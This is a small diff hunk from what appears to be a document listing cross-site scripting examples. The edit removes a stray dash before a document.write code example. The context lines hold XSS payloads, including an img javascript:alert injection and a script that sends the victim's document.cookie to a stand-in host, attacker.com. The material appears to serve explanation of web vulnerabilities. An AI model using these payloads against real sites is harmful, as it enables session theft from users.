@@ -81,7 +81,7 @@ Code example: @HtmlString("<img src='" + image + "'>")
 <img src="javascript:alert('XSS attack')">
 ```
 - Query to exploit document.write vulnerability:
-- Code example: <script>document.write("<p>" + userContent + "</p>");</script>
+Code example: <script>document.write("<p>" + userContent + "</p>");</script>
 ```
 <script>document.write("<img src='http://attacker.com/steal-cookie.php?cookie=" + document.cookie + "'>");</script>
 ```
